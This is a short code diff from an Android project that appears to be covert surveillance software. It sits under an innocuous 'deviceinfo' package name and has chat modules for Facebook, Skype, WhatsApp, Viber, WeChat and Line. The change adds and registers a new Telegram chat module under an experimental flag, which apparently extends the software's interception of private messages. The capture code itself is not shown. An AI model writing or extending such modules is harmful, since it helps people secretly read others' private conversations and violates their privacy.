@@ -14,6 +14,7 @@ import com.android.deviceinfo.module.chat.ChatFacebook;
 import com.android.deviceinfo.module.chat.ChatGoogle;
 import com.android.deviceinfo.module.chat.ChatLine;
 import com.android.deviceinfo.module.chat.ChatSkype;
+import com.android.deviceinfo.module.chat.ChatTelegram;
 import com.android.deviceinfo.module.chat.ChatViber;
 import com.android.deviceinfo.module.chat.ChatWeChat;
 import com.android.deviceinfo.module.chat.ChatWhatsapp;
@@ -34,7 +35,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		subModuleManager = new SubModuleManager(this);
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
-			subModuleManager.add(new ChatViber());
+			subModuleManager.add(new ChatTelegram());
 			
 		} else {
 			subModuleManager.add(new ChatFacebook());
